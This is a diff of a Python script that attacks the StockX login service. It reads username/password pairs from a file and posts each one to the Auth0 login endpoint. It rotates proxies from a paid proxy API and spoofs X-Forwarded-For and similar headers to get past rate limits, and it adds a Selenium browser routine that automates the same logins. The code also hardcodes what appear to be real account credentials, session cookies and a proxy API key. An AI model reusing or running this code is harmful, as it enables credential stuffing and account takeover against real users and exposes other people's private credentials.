@@ -1,9 +1,16 @@
 import json
 import random
 import sys
-from urllib import parse
-import requests
+import time
 from datetime import datetime
+from urllib import parse
+
+import requests
+from selenium import webdriver
+from selenium.webdriver.common.action_chains import ActionChains
+from selenium.webdriver.common.proxy import Proxy
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.proxy import ProxyType
 
 # 中国ip函数
 def get_ip():
@@ -186,6 +193,7 @@ def get_ip():
     ip = '.'.join(_ip)
     return ip
 
+
 # 无限重发
 def repeats():
     with open(sys.path[0] + '/' + str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "") + 'out.txt',
@@ -195,16 +203,46 @@ def repeats():
             ip = get_ip()
 
             url = 'https://accounts.stockx.com/usernamepassword/login'
-            headers = {'Host': 'accounts.stockx.com', 'Connection': 'keep-alive', 'Content-Length': '543', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'sec-ch-ua': '"Chromium";v="106", "Microsoft Edge";v="106", "Not;A=Brand";v="99"', 'Content-Type': 'application/json', 'Auth0-Client': 'eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMTAuNCJ9', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42', 'sec-ch-ua-platform': '"Windows"', 'Accept': '*/*', 'Origin': 'https://accounts.stockx.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://accounts.stockx.com/login?state=hKFo2SBEdTBITkZnOXRISGJ0VXd6WGtabTF6VWs5TzVvb0NYbKFupWxvZ2luo3RpZNkgYzRtcVRFRGMyeUFFalRjQjhwMWxYYTRlTzZDdHFyVVGjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA&client=OVxrt4VJqTx7LIUKd661W0DuVMpcFByD&protocol=oauth2&prompt=login&audience=gateway.stockx.com&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xOS4xIn0%3D&connection=production&lng=zh&redirect_uri=https%3A%2F%2Fstockx.com%2Fcallback%3Fpath%3D%2Fzh-cn&response_mode=query&response_type=code&scope=openid%20profile&stockx-currency=USD&stockx-default-tab=login&stockx-is-gdpr=false&stockx-language=zh-cn&stockx-session-id=2d8f2d60-358c-4f72-9d88-e6a5f83feea2&stockx-url=https%3A%2F%2Fstockx.com&stockx-user-agent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F106.0.0.0%20Safari%2F537.36%20Edg%2F106.0.1370.42&ui_locales=zh-CN', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6', 'Cient_ip': ip, 'X-Forwarded-For': ip,
+            headers = {'Host': 'accounts.stockx.com', 'Connection': 'keep-alive', 'Content-Length': '543',
+                       'Pragma': 'no-cache', 'Cache-Control': 'no-cache',
+                       'sec-ch-ua': '"Chromium";v="106", "Microsoft Edge";v="106", "Not;A=Brand";v="99"',
+                       'Content-Type': 'application/json',
+                       'Auth0-Client': 'eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMTAuNCJ9',
+                       'sec-ch-ua-mobile': '?0',
+                       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
+                       'sec-ch-ua-platform': '"Windows"', 'Accept': '*/*', 'Origin': 'https://accounts.stockx.com',
+                       'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty',
+                       'Referer': 'https://accounts.stockx.com/login?state=hKFo2SBEdTBITkZnOXRISGJ0VXd6WGtabTF6VWs5TzVvb0NYbKFupWxvZ2luo3RpZNkgYzRtcVRFRGMyeUFFalRjQjhwMWxYYTRlTzZDdHFyVVGjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA&client=OVxrt4VJqTx7LIUKd661W0DuVMpcFByD&protocol=oauth2&prompt=login&audience=gateway.stockx.com&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xOS4xIn0%3D&connection=production&lng=zh&redirect_uri=https%3A%2F%2Fstockx.com%2Fcallback%3Fpath%3D%2Fzh-cn&response_mode=query&response_type=code&scope=openid%20profile&stockx-currency=USD&stockx-default-tab=login&stockx-is-gdpr=false&stockx-language=zh-cn&stockx-session-id=2d8f2d60-358c-4f72-9d88-e6a5f83feea2&stockx-url=https%3A%2F%2Fstockx.com&stockx-user-agent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F106.0.0.0%20Safari%2F537.36%20Edg%2F106.0.1370.42&ui_locales=zh-CN',
+                       'Accept-Encoding': 'gzip, deflate, br',
+                       'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6', 'Cient_ip': ip,
+                       'X-Forwarded-For': ip,
                        'X-Originating-IP': ip, 'X-Remote-IP': ip, 'X-Remote-Addr': ip}
-            cookies = {'_csrf': '3mOhHftqo-OXtR4DBjcDUVUZ', '_pxvid': '24d89445-49f3-11ed-b089-50706f744c58', '__pxvid': '2558ea16-49f3-11ed-8c5a-0242ac120002', '__ssid': '35d25268ae9eac82a15aec2277bc6ca', 'lastRskxRun': '1665554416865', 'rskxRunCookie': '0', 'rCookie': 'cu397e3yes5ka8w5hd6bll9583h0i', 'ajs_anonymous_id': '7350e34e-713d-4747-b302-e4c974db3d99', '_gcl_au': '1.1.2006874050.1665554419', 'rbuid': 'rbos-0086f337-a5db-47ad-abb7-62ac6d80dd47', 'did': 's%3Av0%3A45e24250-49f3-11ed-9db3-6d5ba85dfce8.pLJ3xi3e%2ByLk5LVXSiwFyRSNW6UjfIstCJkiELbdiXc', 'auth0': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQM8fX-JaxeSWj8cwsnsR2uZ8J4MvdBNX0OXggIbAKaIdu6q3vDoZeacD_coIHwDK5cOL6NGkI7cE6WX1DoU4FxmmY29va2llg6dleHBpcmVz1_-rqVAAY0pMp65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.A7H3CAXzo%2BPuxxhFv4QZsc5opQ3vRsfM2Osm1IZKi9A', 'did_compat': 's%3Av0%3A45e24250-49f3-11ed-9db3-6d5ba85dfce8.pLJ3xi3e%2ByLk5LVXSiwFyRSNW6UjfIstCJkiELbdiXc', 'auth0_compat': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQM8fX-JaxeSWj8cwsnsR2uZ8J4MvdBNX0OXggIbAKaIdu6q3vDoZeacD_coIHwDK5cOL6NGkI7cE6WX1DoU4FxmmY29va2llg6dleHBpcmVz1_-rqVAAY0pMp65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.A7H3CAXzo%2BPuxxhFv4QZsc5opQ3vRsfM2Osm1IZKi9A', 'QuantumMetricUserID': '378116bf6ce7480a1a4a9ddc59a353f7', 'pxcts': '16ac0def-4c34-11ed-9881-4a6145457766', '_clck': '6wqy4|1|f5q|0', 'forterToken': '1f5d2c3dc6034949bdbe239f1a4ed33f_1665802217222__UDF43_13ck', 'language_code': 'zh', 'QuantumMetricSessionID': '6067e050cf241f874cb4fbf61ff860a6', '_px3': '2cb6f68ebf72aa53553a47de69d1b6360a39b6a754ecac61db512944885d6ae6:ffyPP6sjbfvJsVllm9OvaaWa2kiM5sGaeL6vXKVIGb9mQwzEaVmPDuogj5c0bl3j32qSPAhmU4eK7U3mpvEY1Q', '_pxde': '23cdddc3c31930ec387d365a805305caae47da7bb0c19437723853b378bd09c3:eyJ0aW1lc3RhbXAiOjE2NjU4MDI5NTE4MDQsImZfa2IiOjB9', '_clsk': '15trjb5|1665803096674|2|0|l.clarity.ms/collect', '__cf_bm': 'uRQ9yRS6i38qHf8OXeebmifMU6ZB0jROoN2tyNdRTi4-1665803137-0-AdC/GKemUOlK1sRl6foUNvlt0mB/j6Ldw+1yjGmL53ZRgs1+mzsMt4v6MNZD7SJ7WQE7uDec2ONIwtX3K33f9aU', '_uetsid': '1afcee304c3411ed89505d9bedf2acf2', '_uetvid': '2683d41049f311eda2beed482f7df48e', '_dd_s': 'logs'}
+            cookies = {'_csrf': '3mOhHftqo-OXtR4DBjcDUVUZ', '_pxvid': '24d89445-49f3-11ed-b089-50706f744c58',
+                       '__pxvid': '2558ea16-49f3-11ed-8c5a-0242ac120002', '__ssid': '35d25268ae9eac82a15aec2277bc6ca',
+                       'lastRskxRun': '1665554416865', 'rskxRunCookie': '0', 'rCookie': 'cu397e3yes5ka8w5hd6bll9583h0i',
+                       'ajs_anonymous_id': '7350e34e-713d-4747-b302-e4c974db3d99',
+                       '_gcl_au': '1.1.2006874050.1665554419', 'rbuid': 'rbos-0086f337-a5db-47ad-abb7-62ac6d80dd47',
+                       'did': 's%3Av0%3A45e24250-49f3-11ed-9db3-6d5ba85dfce8.pLJ3xi3e%2ByLk5LVXSiwFyRSNW6UjfIstCJkiELbdiXc',
+                       'auth0': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQM8fX-JaxeSWj8cwsnsR2uZ8J4MvdBNX0OXggIbAKaIdu6q3vDoZeacD_coIHwDK5cOL6NGkI7cE6WX1DoU4FxmmY29va2llg6dleHBpcmVz1_-rqVAAY0pMp65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.A7H3CAXzo%2BPuxxhFv4QZsc5opQ3vRsfM2Osm1IZKi9A',
+                       'did_compat': 's%3Av0%3A45e24250-49f3-11ed-9db3-6d5ba85dfce8.pLJ3xi3e%2ByLk5LVXSiwFyRSNW6UjfIstCJkiELbdiXc',
+                       'auth0_compat': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQM8fX-JaxeSWj8cwsnsR2uZ8J4MvdBNX0OXggIbAKaIdu6q3vDoZeacD_coIHwDK5cOL6NGkI7cE6WX1DoU4FxmmY29va2llg6dleHBpcmVz1_-rqVAAY0pMp65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.A7H3CAXzo%2BPuxxhFv4QZsc5opQ3vRsfM2Osm1IZKi9A',
+                       'QuantumMetricUserID': '378116bf6ce7480a1a4a9ddc59a353f7',
+                       'pxcts': '16ac0def-4c34-11ed-9881-4a6145457766', '_clck': '6wqy4|1|f5q|0',
+                       'forterToken': '1f5d2c3dc6034949bdbe239f1a4ed33f_1665802217222__UDF43_13ck',
+                       'language_code': 'zh', 'QuantumMetricSessionID': '6067e050cf241f874cb4fbf61ff860a6',
+                       '_px3': '2cb6f68ebf72aa53553a47de69d1b6360a39b6a754ecac61db512944885d6ae6:ffyPP6sjbfvJsVllm9OvaaWa2kiM5sGaeL6vXKVIGb9mQwzEaVmPDuogj5c0bl3j32qSPAhmU4eK7U3mpvEY1Q',
+                       '_pxde': '23cdddc3c31930ec387d365a805305caae47da7bb0c19437723853b378bd09c3:eyJ0aW1lc3RhbXAiOjE2NjU4MDI5NTE4MDQsImZfa2IiOjB9',
+                       '_clsk': '15trjb5|1665803096674|2|0|l.clarity.ms/collect',
+                       '__cf_bm': 'uRQ9yRS6i38qHf8OXeebmifMU6ZB0jROoN2tyNdRTi4-1665803137-0-AdC/GKemUOlK1sRl6foUNvlt0mB/j6Ldw+1yjGmL53ZRgs1+mzsMt4v6MNZD7SJ7WQE7uDec2ONIwtX3K33f9aU',
+                       '_uetsid': '1afcee304c3411ed89505d9bedf2acf2', '_uetvid': '2683d41049f311eda2beed482f7df48e',
+                       '_dd_s': 'logs'}
             data = '{"client_id":"OVxrt4VJqTx7LIUKd661W0DuVMpcFByD","redirect_uri":"https://stockx.com/callback?path=/zh-cn","tenant":"stockx-prod","response_type":"code","scope":"openid profile","audience":"gateway.stockx.com","_csrf":"kMa41xeK-dxvibLJvCK2gBSsyR-iF4GFpjWo","state":"hKFo2SBEdTBITkZnOXRISGJ0VXd6WGtabTF6VWs5TzVvb0NYbKFupWxvZ2luo3RpZNkgYzRtcVRFRGMyeUFFalRjQjhwMWxYYTRlTzZDdHFyVVGjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA","_intstate":"deprecated","username":"roland.esakia@gmail.com","password":"Roll332211","connection":"production"}'
 
             # html = requests.post(url, headers=headers, verify=False, cookies=cookies, data=data)
             html = requests.post(url, headers=headers, verify=False, cookies=cookies, data=data,
                                  proxies={'https': 'http://127.0.0.1:8888'})
             thes = json.loads(html.text)
-            if thes['statusCode'] != 400:#429
+            if thes['statusCode'] != 400:  # 429
                 print(html.text)
                 # print(html.text.decode(''))
                 f.writelines(html.text)
@@ -235,21 +273,51 @@ def open_txt2():
             line = read_data[i].strip()
             txt2 = line.split("\t")
             # ip = get_ip()
-            ip =requests.get('http://17680492987.user.xiecaiyun.com/api/proxies?action=getText&key=NP4A43A3ED&count=1&word=&rand=true&norepeat=false&detail=false&ltime=0')
-            ip =ip.text.strip()
+            ip = requests.get(
+                'http://17680492987.user.xiecaiyun.com/api/proxies?action=getText&key=NP4A43A3ED&count=1&word=&rand=true&norepeat=false&detail=false&ltime=0')
+            ip = ip.text.strip()
             print(ip)
             url = 'https://accounts.stockx.com/usernamepassword/login'
-            headers = {'Host': 'accounts.stockx.com', 'Connection': 'keep-alive', 'Content-Length': '530', 'sec-ch-ua': '"Chromium";v="106", "Microsoft Edge";v="106", "Not;A=Brand";v="99"', 'Content-Type': 'application/json', 'Auth0-Client': 'eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMTAuNCJ9', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42', 'sec-ch-ua-platform': '"Windows"', 'Accept': '*/*', 'Origin': 'https://accounts.stockx.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://accounts.stockx.com/login?state=hKFo2SBsLVlTbVR2TDMxcTBZZ3RDcDI2UWVTc1B3cklnenQwc6FupWxvZ2luo3RpZNkgd0hfMDZiQWlIRVJNd1V4UGR3T2lUdjd6Sld2U2RFV0mjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA&client=OVxrt4VJqTx7LIUKd661W0DuVMpcFByD&protocol=oauth2&prompt=login&audience=gateway.stockx.com&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xOS4xIn0%3D&connection=production&lng=en&redirect_uri=https%3A%2F%2Fstockx.com%2Fcallback%3Fpath%3D%2F&response_mode=query&response_type=code&scope=openid%20profile&stockx-currency=USD&stockx-default-tab=login&stockx-is-gdpr=false&stockx-language=en-us&stockx-session-id=ebc6c543-b9c4-4b83-aed3-b646eb34f787&stockx-url=https%3A%2F%2Fstockx.com&stockx-user-agent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F106.0.0.0%20Safari%2F537.36%20Edg%2F106.0.1370.42&ui_locales=en', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'zh-CN,zh;q=0.9'}
-            cookies = {'_csrf': 'dCcje3tzTbfOfyS6nz6LGouE', '__cf_bm': '.2UKnQR9NgFVSZMmoY18pgnZWJnlkC5gnCKbFG1QiBA-1665816436-0-AXZkD+jOUDchiejAOVWvHJouyM3JjMpJ7VqLjOFmGFR5QuQhxgxNuE3nrLhOn1DvfX5Puuxy3RAynBXqvrzfClI', 'pxcts': '37a26909-4c55-11ed-a2d4-766e50474455', '_pxvid': '37a25c7c-4c55-11ed-a2d4-766e50474455', 'forterToken': '04264e16539e4132a52701bcc4f32323_1665816438938__UDF43_13ck', '__pxvid': '37c9496c-4c55-11ed-8233-0242ac120002', 'ajs_anonymous_id': 'f80a2073-8b49-4734-b427-134e1ce884f0', '_gcl_au': '1.1.1859648209.1665816440', '_clck': 'uiq1zh|1|f5q|0', 'rbuid': 'rbos-345454e7-5b8f-45ef-a670-311db306c0c3', '_px3': '1860464ddb59bc2be3221f0aec398a7a9a1fee589fa8048fd63f8891bf6700c8:ww3m4axNTP6R569SG9adUAFYt0cZ3YLnLqLyN8d/T+gyk57bGNGwyz9/PSDQwICqX/uDpMxQM0vyg6PJGLFfpg', 'did': 's%3Av0%3A4c094340-4c55-11ed-9d04-790e9c2b5e68.art%2B5kxLf5axO6iCXtaBATVSGTjlmjH%2BttPNzI0ZPdY', 'auth0': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQF_Wd4a0aQEqQhsgd33RwbX9Hg779jlQqFxR23EzJKmRjEODzTesh0z540N8JvLwftRA66CnhTa0lotvn33dbtemY29va2llg6dleHBpcmVz1_8NHO8AY05MG65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.zd9SKBMlN5eZBLvBaKfXFYEogGKmc4pz79WsvpHuKFg', 'did_compat': 's%3Av0%3A4c094340-4c55-11ed-9d04-790e9c2b5e68.art%2B5kxLf5axO6iCXtaBATVSGTjlmjH%2BttPNzI0ZPdY', 'auth0_compat': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQF_Wd4a0aQEqQhsgd33RwbX9Hg779jlQqFxR23EzJKmRjEODzTesh0z540N8JvLwftRA66CnhTa0lotvn33dbtemY29va2llg6dleHBpcmVz1_8NHO8AY05MG65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.zd9SKBMlN5eZBLvBaKfXFYEogGKmc4pz79WsvpHuKFg', '_clsk': '1d684tz|1665816480444|2|0|l.clarity.ms/collect', 'language_code': 'en', '_uetsid': '372d7f304c5511edadc3775920b54518', '_uetvid': '372dbc104c5511ed9f86ef2042a4d88c', '_pxde': 'eaa382f6d2bd416caf95a0cbe51755fbbd99e4b6b0cb0c20fa87248c4a286f9c:eyJ0aW1lc3RhbXAiOjE2NjU4MTY1MjYxNDMsImZfa2IiOjB9', 'QuantumMetricSessionID': '1de20627dfab78e60796c899dfd6f8b7', 'QuantumMetricUserID': '940372d5ff5606c5017355a57683a23c', '_dd_s': 'logs'}
-            data = '{"client_id":"OVxrt4VJqTx7LIUKd661W0DuVMpcFByD","redirect_uri":"https://stockx.com/callback?path=/","tenant":"stockx-prod","response_type":"code","scope":"openid profile","audience":"gateway.stockx.com","_csrf":"Hr64JECi-eh3qbkrmluW8r-UOS9mstJPLYik","state":"hKFo2SBsLVlTbVR2TDMxcTBZZ3RDcDI2UWVTc1B3cklnenQwc6FupWxvZ2luo3RpZNkgd0hfMDZiQWlIRVJNd1V4UGR3T2lUdjd6Sld2U2RFV0mjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA","_intstate":"deprecated","username":"'+txt2[1]+'","password":"'+txt2[2]+'","connection":"production"}'
+            headers = {'Host': 'accounts.stockx.com', 'Connection': 'keep-alive', 'Content-Length': '530',
+                       'sec-ch-ua': '"Chromium";v="106", "Microsoft Edge";v="106", "Not;A=Brand";v="99"',
+                       'Content-Type': 'application/json',
+                       'Auth0-Client': 'eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMTAuNCJ9',
+                       'sec-ch-ua-mobile': '?0',
+                       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
+                       'sec-ch-ua-platform': '"Windows"', 'Accept': '*/*', 'Origin': 'https://accounts.stockx.com',
+                       'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty',
+                       'Referer': 'https://accounts.stockx.com/login?state=hKFo2SBsLVlTbVR2TDMxcTBZZ3RDcDI2UWVTc1B3cklnenQwc6FupWxvZ2luo3RpZNkgd0hfMDZiQWlIRVJNd1V4UGR3T2lUdjd6Sld2U2RFV0mjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA&client=OVxrt4VJqTx7LIUKd661W0DuVMpcFByD&protocol=oauth2&prompt=login&audience=gateway.stockx.com&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xOS4xIn0%3D&connection=production&lng=en&redirect_uri=https%3A%2F%2Fstockx.com%2Fcallback%3Fpath%3D%2F&response_mode=query&response_type=code&scope=openid%20profile&stockx-currency=USD&stockx-default-tab=login&stockx-is-gdpr=false&stockx-language=en-us&stockx-session-id=ebc6c543-b9c4-4b83-aed3-b646eb34f787&stockx-url=https%3A%2F%2Fstockx.com&stockx-user-agent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F106.0.0.0%20Safari%2F537.36%20Edg%2F106.0.1370.42&ui_locales=en',
+                       'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'zh-CN,zh;q=0.9'}
+            cookies = {'_csrf': 'dCcje3tzTbfOfyS6nz6LGouE',
+                       '__cf_bm': '.2UKnQR9NgFVSZMmoY18pgnZWJnlkC5gnCKbFG1QiBA-1665816436-0-AXZkD+jOUDchiejAOVWvHJouyM3JjMpJ7VqLjOFmGFR5QuQhxgxNuE3nrLhOn1DvfX5Puuxy3RAynBXqvrzfClI',
+                       'pxcts': '37a26909-4c55-11ed-a2d4-766e50474455',
+                       '_pxvid': '37a25c7c-4c55-11ed-a2d4-766e50474455',
+                       'forterToken': '04264e16539e4132a52701bcc4f32323_1665816438938__UDF43_13ck',
+                       '__pxvid': '37c9496c-4c55-11ed-8233-0242ac120002',
+                       'ajs_anonymous_id': 'f80a2073-8b49-4734-b427-134e1ce884f0',
+                       '_gcl_au': '1.1.1859648209.1665816440', '_clck': 'uiq1zh|1|f5q|0',
+                       'rbuid': 'rbos-345454e7-5b8f-45ef-a670-311db306c0c3',
+                       '_px3': '1860464ddb59bc2be3221f0aec398a7a9a1fee589fa8048fd63f8891bf6700c8:ww3m4axNTP6R569SG9adUAFYt0cZ3YLnLqLyN8d/T+gyk57bGNGwyz9/PSDQwICqX/uDpMxQM0vyg6PJGLFfpg',
+                       'did': 's%3Av0%3A4c094340-4c55-11ed-9d04-790e9c2b5e68.art%2B5kxLf5axO6iCXtaBATVSGTjlmjH%2BttPNzI0ZPdY',
+                       'auth0': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQF_Wd4a0aQEqQhsgd33RwbX9Hg779jlQqFxR23EzJKmRjEODzTesh0z540N8JvLwftRA66CnhTa0lotvn33dbtemY29va2llg6dleHBpcmVz1_8NHO8AY05MG65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.zd9SKBMlN5eZBLvBaKfXFYEogGKmc4pz79WsvpHuKFg',
+                       'did_compat': 's%3Av0%3A4c094340-4c55-11ed-9d04-790e9c2b5e68.art%2B5kxLf5axO6iCXtaBATVSGTjlmjH%2BttPNzI0ZPdY',
+                       'auth0_compat': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQF_Wd4a0aQEqQhsgd33RwbX9Hg779jlQqFxR23EzJKmRjEODzTesh0z540N8JvLwftRA66CnhTa0lotvn33dbtemY29va2llg6dleHBpcmVz1_8NHO8AY05MG65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.zd9SKBMlN5eZBLvBaKfXFYEogGKmc4pz79WsvpHuKFg',
+                       '_clsk': '1d684tz|1665816480444|2|0|l.clarity.ms/collect', 'language_code': 'en',
+                       '_uetsid': '372d7f304c5511edadc3775920b54518', '_uetvid': '372dbc104c5511ed9f86ef2042a4d88c',
+                       '_pxde': 'eaa382f6d2bd416caf95a0cbe51755fbbd99e4b6b0cb0c20fa87248c4a286f9c:eyJ0aW1lc3RhbXAiOjE2NjU4MTY1MjYxNDMsImZfa2IiOjB9',
+                       'QuantumMetricSessionID': '1de20627dfab78e60796c899dfd6f8b7',
+                       'QuantumMetricUserID': '940372d5ff5606c5017355a57683a23c', '_dd_s': 'logs'}
+            data = '{"client_id":"OVxrt4VJqTx7LIUKd661W0DuVMpcFByD","redirect_uri":"https://stockx.com/callback?path=/","tenant":"stockx-prod","response_type":"code","scope":"openid profile","audience":"gateway.stockx.com","_csrf":"Hr64JECi-eh3qbkrmluW8r-UOS9mstJPLYik","state":"hKFo2SBsLVlTbVR2TDMxcTBZZ3RDcDI2UWVTc1B3cklnenQwc6FupWxvZ2luo3RpZNkgd0hfMDZiQWlIRVJNd1V4UGR3T2lUdjd6Sld2U2RFV0mjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA","_intstate":"deprecated","username":"' + \
+                   txt2[1] + '","password":"' + txt2[2] + '","connection":"production"}'
 
             # html = requests.post(url, headers=headers, verify=False, cookies=cookies, data=data)
             # urls = "http://17680492987:17680492987@"+ip
-            html = requests.post(url, headers=headers, verify=False, cookies=cookies, data=data, proxies={'HTTPS':'HTTPS://'+ip})
+            html = requests.post(url, headers=headers, verify=False, cookies=cookies, data=data,
+                                 proxies={'HTTPS': 'HTTPS://' + ip})
             try:
                 thes = json.loads(html.text)
                 print(line)
-                if thes['statusCode'] != 400 and thes['statusCode'] != 429:#429
+                if thes['statusCode'] != 400 and thes['statusCode'] != 429:  # 429
                     print(html.text)
                     # print(html.text.decode(''))
                     f.writelines(line, html.text)
@@ -258,5 +326,75 @@ def open_txt2():
                 continue
 
 
-open_txt2()
+# 用于快速设置 profile 的代理信息的方法
+def get_firefox_profile_with_proxy_set(profile, proxy_host):
+    # proxy_host
+    proxy_list = proxy_host.split(':')
+    agent_ip = proxy_list[0]
+    agent_port = proxy_list[1]
+
+
+    profile.set_preference('network.proxy.type', 1)  # 使用代理
+    profile.set_preference('network.proxy.share_proxy_settings', True)  # 所有协议公用一种代理配置
+    profile.set_preference('network.proxy.http', agent_ip)
+    profile.set_preference('network.proxy.http_port', int(agent_port))
+    profile.set_preference('permissions.default.image',2)#无图模式
+    profile.set_preference('network.proxy.ssl', agent_ip)
+    profile.set_preference('network.proxy.ssl_port', int(agent_port))
+    # 对于localhost的不用代理，这里必须要配置，否则无法和 webdriver 通讯
+    profile.set_preference('network.proxy.no_proxies_on', 'localhost,127.0.0.1')
+    profile.set_preference('network.http.use-cache', False)
+    proxy = Proxy({
+        'proxyType': ProxyType.MANUAL,
+        'httpProxy': proxy_host,
+        'ftpProxy': proxy_host,
+        'sslProxy': proxy_host,
+        'noProxy': ''
+    })
+    return profile,proxy
+
+
+# 读文件切割登录网页重发
+def open_web():
+    with open(sys.path[0] + '/z.txt', 'r', encoding='utf-8') as f:
+        read_data = f.readlines()
+        for i in range(len(read_data)):
+            try:
+
+                line = read_data[i].strip()
+                txt2 = line.split("\t")
+                # ip = get_ip()
+                ip = requests.get(
+                    'http://17680492987.user.xiecaiyun.com/api/proxies?action=getText&key=NP4A43A3ED&count=1&word=&rand=true&norepeat=false&detail=false&ltime=0')
+                myProxy = ip.text.strip()
+                print("代理",myProxy)
+                profile = webdriver.FirefoxProfile()
+                # if proxy:
+                profile,proxy = get_firefox_profile_with_proxy_set(profile, myProxy)
+                # if user_agent:
+                #     profile.set_preference("general.useragent.override", user_agent)
+                driver = webdriver.Firefox(firefox_profile=profile)
+                # driver = webdriver.Firefox(options=chrome_options)
+                # time.sleep(1)
+                driver.get("https://stockx.com/")
+                driver.set_window_size(890, 895)
+                driver.find_element(By.CSS_SELECTOR, ".chakra-modal__close-btn").click()
+                driver.find_element(By.CSS_SELECTOR, ".css-f9o8up").click()
+                driver.find_element(By.ID, "email-login").send_keys("106656@qq.com")
+                driver.find_element(By.ID, "password-login").send_keys("xxxx123")
+                driver.find_element(By.ID, "btn-login").click()
+                driver.quit()
+                # thes = json.loads(html.text)
+                print(line)
+                if False:  # 429
+                    # print(html.text)
+                    # print(html.text.decode(''))
+                    f.writelines(line, html.text)
+                    f.flush()
+            except:
+                continue
+
+
+open_web()
+# open_txt2()
 # repeats()
